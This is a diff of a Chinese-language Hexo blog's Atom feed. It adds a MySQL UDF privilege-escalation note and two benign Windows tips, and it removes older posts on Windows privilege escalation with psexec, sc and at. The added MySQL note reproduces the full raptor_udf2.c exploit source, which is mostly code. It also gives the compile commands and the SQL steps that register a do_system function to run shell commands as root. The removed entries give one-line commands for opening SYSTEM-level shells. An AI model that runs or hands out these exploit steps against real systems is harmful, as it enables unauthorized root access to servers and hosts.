@@ -6,7 +6,7 @@
   <link href="https://loli.fj.cn/atom.xml" rel="self"/>
   
   <link href="https://loli.fj.cn/"/>
-  <updated>2024-08-06T02:31:29.762Z</updated>
+  <updated>2024-08-06T20:00:06.214Z</updated>
   <id>https://loli.fj.cn/</id>
   
   <author>
@@ -15,6 +15,65 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【笔记】Mysql的UDF提权</title>
+    <link href="https://loli.fj.cn/2024/08/06/Mysql%E7%9A%84UDF%E6%8F%90%E6%9D%83/"/>
+    <id>https://loli.fj.cn/2024/08/06/Mysql%E7%9A%84UDF%E6%8F%90%E6%9D%83/</id>
+    <published>2024-08-06T06:57:21.000Z</published>
+    <updated>2024-08-06T20:00:06.214Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Mysql的UDF提权</p><span id="more"></span><h2 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://www.exploit-db.com/download/1518</span><br></pre></td></tr></table></figure><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><figcaption><span>1518.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * raptor_udf2.c - dynamic library for do_system() MySQL UDF</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2006 Marco Ivaldi &lt;raptor@0xdeadbeef.info&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This is an helper dynamic library for local privilege escalation through</span></span><br><span class="line"><span class="comment"> * MySQL run with root privileges (very bad idea!), slightly modified to work </span></span><br><span class="line"><span class="comment"> * with newer versions of the open-source database. Tested on MySQL 4.1.14.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes</span></span><br><span class="line"><span class="comment"> * for the security vulnerabilities in the handling of User Defined Functions</span></span><br><span class="line"><span class="comment"> * (UDFs) reported by Stefano Di Paola &lt;stefano.dipaola@wisec.it&gt;. For further</span></span><br><span class="line"><span class="comment"> * details, please refer to:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html</span></span><br><span class="line"><span class="comment"> * http://www.wisec.it/vulns.php?page=4</span></span><br><span class="line"><span class="comment"> * http://www.wisec.it/vulns.php?page=5</span></span><br><span class="line"><span class="comment"> * http://www.wisec.it/vulns.php?page=6</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &quot;UDFs should have at least one symbol defined in addition to the xxx symbol </span></span><br><span class="line"><span class="comment"> * that corresponds to the main xxx() function. These auxiliary symbols </span></span><br><span class="line"><span class="comment"> * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and </span></span><br><span class="line"><span class="comment"> * xxx_add() functions&quot;. -- User Defined Functions Security Precautions </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Usage:</span></span><br><span class="line"><span class="comment"> * $ id</span></span><br><span class="line"><span class="comment"> * uid=500(raptor) gid=500(raptor) groups=500(raptor)</span></span><br><span class="line"><span class="comment"> * $ gcc -g -c raptor_udf2.c</span></span><br><span class="line"><span class="comment"> * $ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span></span><br><span class="line"><span class="comment"> * $ mysql -u root -p</span></span><br><span class="line"><span class="comment"> * Enter password:</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> * mysql&gt; use mysql;</span></span><br><span class="line"><span class="comment"> * mysql&gt; create table foo(line blob);</span></span><br><span class="line"><span class="comment"> * mysql&gt; insert into foo values(load_file(&#x27;/home/raptor/raptor_udf2.so&#x27;));</span></span><br><span class="line"><span class="comment"> * mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/raptor_udf2.so&#x27;;</span></span><br><span class="line"><span class="comment"> * mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span></span><br><span class="line"><span class="comment"> * mysql&gt; select * from mysql.func;</span></span><br><span class="line"><span class="comment"> * +-----------+-----+----------------+----------+</span></span><br><span class="line"><span class="comment"> * | name      | ret | dl             | type     |</span></span><br><span class="line"><span class="comment"> * +-----------+-----+----------------+----------+</span></span><br><span class="line"><span class="comment"> * | do_system |   2 | raptor_udf2.so | function |</span></span><br><span class="line"><span class="comment"> * +-----------+-----+----------------+----------+</span></span><br><span class="line"><span class="comment"> * mysql&gt; select do_system(&#x27;id &gt; /tmp/out; chown raptor.raptor /tmp/out&#x27;);</span></span><br><span class="line"><span class="comment"> * mysql&gt; \! sh</span></span><br><span class="line"><span class="comment"> * sh-2.05b$ cat /tmp/out</span></span><br><span class="line"><span class="comment"> * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)</span></span><br><span class="line"><span class="comment"> * [...]</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Item_result</span> &#123;</span>STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_udf_args</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>arg_count;<span class="comment">// number of arguments</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Item_result</span>*<span class="title">arg_type</span>;</span><span class="comment">// pointer to item_result</span></span><br><span class="line"><span class="type">char</span> **args;<span class="comment">// pointer to arguments</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>*lengths;<span class="comment">// length of string args</span></span><br><span class="line"><span class="type">char</span>*maybe_null;<span class="comment">// 1 for maybe_null args</span></span><br><span class="line">&#125; UDF_ARGS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">st_udf_init</span> &#123;</span></span><br><span class="line"><span class="type">char</span>maybe_null;<span class="comment">// 1 if func can return NULL</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>decimals;<span class="comment">// for real functions</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> max_length;<span class="comment">// for string functions</span></span><br><span class="line"><span class="type">char</span>*ptr;<span class="comment">// free ptr for func data</span></span><br><span class="line"><span class="type">char</span>const_item;<span class="comment">// 0 if result is constant</span></span><br><span class="line">&#125; UDF_INIT;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">do_system</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *is_null, <span class="type">char</span> *error)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (args-&gt;arg_count != <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">system(args-&gt;args[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> <span class="title function_">do_system_init</span><span class="params">(UDF_INIT *initid, UDF_ARGS *args, <span class="type">char</span> *message)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// milw0rm.com [2006-02-20]</span></span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared 1518.o -lc -o 1518.so</span><br></pre></td></tr></table></figure><ul><li>得到<code>1518.so</code>文件</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="通过插件创建函数"><a href="#通过插件创建函数" class="headerlink" title="通过插件创建函数"></a>通过插件创建函数</h3><blockquote><p><code>&lt;file_name&gt;.so</code>：上一步骤导出的dll文件或so文件名</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">CREATE FUNCTION x RETURNS STRING SONAME <span class="string">&#x27;&lt;file_name&gt;.so&#x27;</span>;</span></span><br></pre></td></tr></table></figure><h3 id="查看所有函数"><a href="#查看所有函数" class="headerlink" title="查看所有函数"></a>查看所有函数</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">SELECT * FROM mysql.func;</span></span><br></pre></td></tr></table></figure><h3 id="利用函数以操作系统管理员身份执行Shell命令"><a href="#利用函数以操作系统管理员身份执行Shell命令" class="headerlink" title="利用函数以操作系统管理员身份执行Shell命令"></a>利用函数以操作系统管理员身份执行Shell命令</h3><blockquote><p><code>&lt;shell&gt;</code>：Shell命令</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT x(&#x27;&lt;shell&gt;&#x27;);</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Mysql的UDF提权&lt;/p&gt;</summary>
+    
+    
+    
+    
+    <category term="Mysql" scheme="https://loli.fj.cn/tags/Mysql/"/>
+    
+    <category term="Database" scheme="https://loli.fj.cn/tags/Database/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【笔记】将WindowsTerminal作为Windows默认终端</title>
+    <link href="https://loli.fj.cn/2024/08/06/%E5%B0%86WindowsTerminal%E4%BD%9C%E4%B8%BAWindows%E9%BB%98%E8%AE%A4%E7%BB%88%E7%AB%AF/"/>
+    <id>https://loli.fj.cn/2024/08/06/%E5%B0%86WindowsTerminal%E4%BD%9C%E4%B8%BAWindows%E9%BB%98%E8%AE%A4%E7%BB%88%E7%AB%AF/</id>
+    <published>2024-08-06T06:45:45.000Z</published>
+    <updated>2024-08-06T20:00:06.214Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>将WindowsTerminal作为Windows默认终端</p><span id="more"></span><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ul><li>打开命令提示符，右键标题栏-&gt;<code>属性</code></li></ul><p><img src="/images/20240806144545/01.webp"></p><ul><li><code>终端</code>-&gt;修改<code>默认终端应用程序</code>改为<code>Windows Terminal</code>-&gt;<code>确定</code></li></ul><p><img src="/images/20240806144545/02.webp"></p><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><ul><li>此时在运行时打开<code>cmd</code>会弹出 Windows Terminal 窗口</li></ul><p><img src="/images/20240806144545/03.webp"></p><ul><li>此时右键开始菜单时，打开<code>Windows Powershell</code>也会弹出 Windows Terminal 窗口</li></ul><p><img src="/images/20240806144545/04.webp"></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://answers.microsoft.com/zh-hans/windows/forum/all/%E5%B0%86windows/ee4c85ca-b4ad-49c3-b992-6db75175868b">微软社区——赵城玉</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;将WindowsTerminal作为Windows默认终端&lt;/p&gt;</summary>
+    
+    
+    
+    
+    <category term="Windows" scheme="https://loli.fj.cn/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【笔记】PowerShell压缩和解压缩zip文件</title>
+    <link href="https://loli.fj.cn/2024/08/06/PowerShell%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9zip%E6%96%87%E4%BB%B6/"/>
+    <id>https://loli.fj.cn/2024/08/06/PowerShell%E5%8E%8B%E7%BC%A9%E5%92%8C%E8%A7%A3%E5%8E%8B%E7%BC%A9zip%E6%96%87%E4%BB%B6/</id>
+    <published>2024-08-06T06:34:36.000Z</published>
+    <updated>2024-08-06T20:00:06.214Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PowerShell压缩和解压缩zip文件</p><span id="more"></span><h2 id="压缩为zip文件"><a href="#压缩为zip文件" class="headerlink" title="压缩为zip文件"></a>压缩为zip文件</h2><blockquote><p><code>&lt;dir_or_file&gt;</code>：被压缩的文件或目录<br><code>&lt;file&gt;.zip</code>：压缩后的压缩文件存放路径<br><code>-Confirm</code>：压缩前确认</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Compress-Archive</span> <span class="literal">-Path</span> <span class="string">&quot;&lt;dir_or_file&gt;&quot;</span> <span class="literal">-DestinationPath</span> <span class="string">&quot;&lt;file&gt;.zip&quot;</span></span><br></pre></td></tr></table></figure><h2 id="解压缩zip文件"><a href="#解压缩zip文件" class="headerlink" title="解压缩zip文件"></a>解压缩zip文件</h2><blockquote><p><code>&lt;file&gt;.zip</code>：被解压缩的文件<br><code>&lt;dir&gt;</code>：解压后的存放路径<br><code>-Confirm</code>：解压前确认</p></blockquote><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Expand-Archive</span> <span class="literal">-Path</span> <span class="string">&quot;&lt;file&gt;.zip&quot;</span> <span class="literal">-DestinationPath</span> <span class="string">&quot;&lt;dir&gt;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://www.cnblogs.com/cqpanda/p/16153860.html">博客园——重庆熊猫</a><br><a href="https://learn.microsoft.com/zh-cn/powershell/module/microsoft.powershell.archive/expand-archive?view=powershell-7.4">微软官方文档</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;PowerShell压缩和解压缩zip文件&lt;/p&gt;</summary>
+    
+    
+    
+    
+    <category term="Windows" scheme="https://loli.fj.cn/tags/Windows/"/>
+    
+  </entry>
   
   <entry>
     <title>【笔记】C语言执行Shell命令</title>
@@ -340,63 +399,6 @@
     
     
     <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Windows将低权限进程迁移到高权限进程，并共享高权限，从而实现提权&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="Windows" scheme="https://loli.fj.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【笔记】Windows利用psexec命令提权</title>
-    <link href="https://loli.fj.cn/2024/08/01/Windows%E5%88%A9%E7%94%A8psexec%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/"/>
-    <id>https://loli.fj.cn/2024/08/01/Windows%E5%88%A9%E7%94%A8psexec%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/</id>
-    <published>2024-08-01T07:54:35.000Z</published>
-    <updated>2024-08-06T02:31:29.926Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows利用psexec命令提权</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Windows 2012</li><li>Windows 2016</li><li>Windows 2018</li></ul><h2 id="下载psexec"><a href="#下载psexec" class="headerlink" title="下载psexec"></a>下载psexec</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.sysinternals.com/files/PSTools.zip</span><br><span class="line">unzip PSTools.zip</span><br><span class="line">cd PSTools</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>打开高权限命令提示符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\psexec.exe -accepteula -s -i -d cmd</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="/302.html?target=https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec">微软官方文档</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Windows利用psexec命令提权&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="Windows" scheme="https://loli.fj.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【笔记】Windows利用sc命令提权</title>
-    <link href="https://loli.fj.cn/2024/08/01/Windows%E5%88%A9%E7%94%A8sc%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/"/>
-    <id>https://loli.fj.cn/2024/08/01/Windows%E5%88%A9%E7%94%A8sc%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/</id>
-    <published>2024-08-01T07:50:32.000Z</published>
-    <updated>2024-08-06T02:31:29.926Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows利用sc命令提权</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Windows 2003</li><li>Windows 2008</li><li>Windows 2012</li><li>Windows 2016（2k3）</li><li>Windows 7</li><li>Windows 8</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>创建一个打开高权限命令提示符的服务</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create x binPath=&quot;cmd /K start&quot; type=own type=interact</span><br></pre></td></tr></table></figure><ul><li>启动服务</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start x</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Windows利用sc命令提权&lt;/p&gt;</summary>
-    
-    
-    
-    
-    <category term="Windows" scheme="https://loli.fj.cn/tags/Windows/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【笔记】Windows利用at命令提权</title>
-    <link href="https://loli.fj.cn/2024/08/01/Windows%E5%88%A9%E7%94%A8at%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/"/>
-    <id>https://loli.fj.cn/2024/08/01/Windows%E5%88%A9%E7%94%A8at%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83/</id>
-    <published>2024-08-01T07:47:22.000Z</published>
-    <updated>2024-08-06T02:31:29.926Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Windows利用at命令提权</p><span id="more"></span><h2 id="漏洞利用前提"><a href="#漏洞利用前提" class="headerlink" title="漏洞利用前提"></a>漏洞利用前提</h2><ul><li>Windows 2000 </li><li>Windows 2003 </li><li>Windows xp</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><blockquote><p><code>00:00</code>：指定时间打开高权限命令提示符</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 00:00 /interactive cmd</span><br></pre></td></tr></table></figure><h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2>]]></content>
-    
-    
-    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Windows利用at命令提权&lt;/p&gt;</summary>
     
     
     
